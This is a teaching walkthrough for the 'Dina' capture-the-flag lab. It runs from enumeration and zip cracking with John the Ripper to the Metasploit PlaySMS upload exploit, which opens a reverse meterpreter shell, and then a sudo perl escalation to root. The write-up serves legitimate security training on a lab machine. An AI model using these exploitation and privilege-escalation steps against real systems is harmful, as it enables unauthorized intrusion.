# Metasploit CTF [Dina]

Welcome to our walkthrough of Dina for the Zero Trust World 2024 Conference.
This write up will be most helpful while following along with the class.

If you need to you can jump ahead to a given section to keep up with the class.
If not just follow along with this and you should get the flag.

## Table of Contents

- [Metasploit CTF \[Dina\]](#metasploit-ctf-dina)
  - [Table of Contents](#table-of-contents)
- [Given information and Objective](#given-information-and-objective)
- [Enumeration](#enumeration)
  - [Nmap Port Scan](#nmap-port-scan)
  - [GoBuster Directory Scan](#gobuster-directory-scan)
  - [Directory Search](#directory-search)
    - [Nothing](#nothing)
    - [Secure](#secure)
      - [Cracking with John the Ripper](#cracking-with-john-the-ripper)
    - [PlaySMS Gateway](#playsms-gateway)
- [Exploitation](#exploitation)
  - [PlaySMS Exploit](#playsms-exploit)
- [Privilege Escalation](#privilege-escalation)
- [Collect the flag and win](#collect-the-flag-and-win)
- [Resources](#resources)

# Given information and Objective

> **Dina IP:** 192.168.56.3

> **Objective:** Collect the flag stored in `/root/flag.txt`

# Enumeration

We are going to need to gather intel on our target first. If you are
following along with the class, then the IP address that we will focus on will
be `192.168.56.3`.

## Nmap Port Scan

Nmap is a useful and reliable tool used by hackers of all calibers. We are going
to be using nmap to scan for ports, so configuring the command below will get
our desired results.

```shell
nmap -sV -sC -p- -oN scan.txt <MACHINE-IP>
```

## GoBuster Directory Scan

```shell
gobuster dir -u http://<MACHINE-IP-HERE> -w /usr/share/wordlists/dirb/big.txt
```

## Directory Search

Thanks to the results of our nmap and GoBuster scans, we have a few directories
to check. Some directories look more interesting than others, but its always
important to check all of them in case you miss something.

- `/nothing`
- `/secure`
- `/tmp`
- `/uploads`

### Nothing

But sometimes we will get something interesting. If we look in the `/nothing`
directory it will say nothing found, except that it doesn't look like the
normal error that would occur on finding nothing.

This is a regular page. We might find more if we look in the source code using
`F12` or `CTRL+U` to view the source code, you will get the same response as
shown below.

```html
<html>
<head><title>404 NOT FOUND</title></head>
<body>
<!--
#my secret pass
freedom
password
helloworld!
diana
iloveroot
-->
<h1>NOT FOUND</html>
<h3>go back</h3>
</body>
</html>
```

The source code says that the developer likes using these passwords. Just in
case, its a good idea to keep a file containing these password in case you
need them in the future.

```
freedom
password
helloworld!
diana
iloveroot
```

**BREAK POINT** Any questions so far?

### Secure

Looking into the `/secure` we can see that we have a zip file called `backup.zip`.
After downloading it and attempting to open the zip file, we can see that
`backup-creds.mp3` is encrypted with a password. This can be dealt with using
john the ripper.

![Attempting to open password protected file](../../Assets/Metasploit_CTF/zip_password_800x630.jpg)

#### Cracking with John the Ripper

```shell
$ zip2john backup.zip > backup.hash
```

Now that we have our hash and our wordlist, its time to bruteforce the password.

```shell
john --wordlist=<PASSWORD-FILE> <HASH_FILE>
```

And now we can see that the password to our zip file is **freedom**. We can go
back and decrypt our new creds mp3.

![creds.mp3 failing to play](../../Assets/Metasploit_CTF/backup_audio_error_800x587.jpg)

You may notice upon opening it that the media file breaks. Linux does not
differentiate file types based on the extension, so using the ending extension
to a file can be misleading. We can see what file type it is using the `file`
command.

```shell
$ file backup-cred.mp3
backup-cred.mp3: ASCII text
```

### PlaySMS Gateway

Looking at the `/SecreTSMSgatwayLogin`, we can see that we have a login screen.

![PlaySMS login screen](../../Assets/Metasploit_CTF/playsms_login_800x459.jpg)

| Username | Password |
| -------- | -------- |
| touhid   | diana    |

# Exploitation

```shell
msfconsole
```

**BREAK POINT** Any questions so far?

## PlaySMS Exploit

While in metasploit, we will want to search for PlaySMS in the framework.

```shell
msf > search playsms

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/playsms_uploadcsv_exec      2017-05-21       excellent  Yes    PlaySMS import.php Authenticated CSV File Upload Code Execution
   1  exploit/multi/http/playsms_template_injection  2020-02-05       excellent  Yes    PlaySMS index.php Unauthenticated Template Injection Code Execution
   2  exploit/multi/http/playsms_filename_exec       2017-05-21       excellent  Yes    PlaySMS sendfromfile.php Authenticated "Filename" Field Code Execution


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/playsms_filename_exec
```

In a normal pentest, we would want to check each module to find an attack that
sticks, so lets start with the first module. We can select it with `use 0` to
refer to the index number in the search or use the absolute path.

```shell
msf > use exploit/multi/http/playsms_uploadcsv_exec
```

Next we are going to change our settings to point this module at our target so
that we can see if it is exploitable. Sometimes you will need to set a variable
multiple times in multiple modules. We can use `setg` to get the variable
globally to make things easier.

```shell
msf > options

Module options (exploit/multi/http/playsms_uploadcsv_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/bas
                                         ics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base playsms directory path
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PlaySMS 1.4



View the full module info with the info, or info -d command.

msf > set targeturi /SecreTSMSgatwayLogin
targeturi => /SecreTSMSgatwayLogin
msf > setg rhosts 192.168.56.3
rhosts => 192.168.56.3
msf > set username touhid
username => touhid
msf > set password diana
password => diana
msf > setg lhost eth1
lhost => 192.168.56.5
```

Now that we have configured all of our options, the next step is to check if the
exploit will work. We simply run `check` and it will do all of the work for us.

```shell
msf > check
[*] 192.168.56.3:80 - The target appears to be vulnerable.
```

```shell
msf > exploit

[*] Started reverse TCP handler on 192.168.56.113:4444
[+] Authentication successful: touhid:diana
[*] Sending stage (39927 bytes) to 192.168.56.112
[*] Meterpreter session 1 opened (192.168.56.113:4444 -> 192.168.56.112:38565) at 2024-02-14 14:36:46 -0500
```

**BREAK POINT** Any questions so far?

And now you should be given a meterpreter session, which is just a more advanced
remote control point. To get terminal access, we only need to type in
`shell`. To make it cleaner, we run a python command to spawn us a really nice
shell.

```shell
meterpreter > shell
> python -c 'import pty;pty.spawn("/bin/bash")'
$
```

> This will give you a nice shell but no tab completions, so be sure to spell correctly.

Looking at the shell given, we are running as the user "*www-data*". We have
completed step 1 of getting access to the machine. The next step is getting access
to root from here.

# Privilege Escalation

```shell
sudo -l
```

In order to take advantage of this, we are going to need to figure out how to
make a shell with perl. Luckily we have resources that can help us, such as
[GTFOBins](https://gtfobins.github.io/).

![sudo section of gtfobins perl](../../Assets/Metasploit_CTF/gtfobins_perl_800x177.jpg)

```shell
sudo perl -e 'exec "/bin/sh";'
```

```shell
# whoami
root
```

# Collect the flag and win

```shell
# cat /root/flag.txt
________                                                _________
\________\--------___       ___         ____----------/_________/
    \_______\----\\\\\\   //_ _ \\    //////-------/________/
        \______\----\\|| (( ~|~ )))  ||//------/________/
            \_____\---\\ ((\ = / ))) //----/_____/
                 \____\--\_)))  \ _)))---/____/
                       \__/  (((     (((_/
                          |  -)))  -  ))


root password is : hello@3210
easy one .....but hard to guess.....
but i think u dont need root password......
u already have root shelll....


CONGO.........
FLAG : 22d06624cd604a0626eb5a2992a6f2e6
```

And with that, we have pwned the machine.

# Resources

- GTFOBins: https://gtfobins.github.io/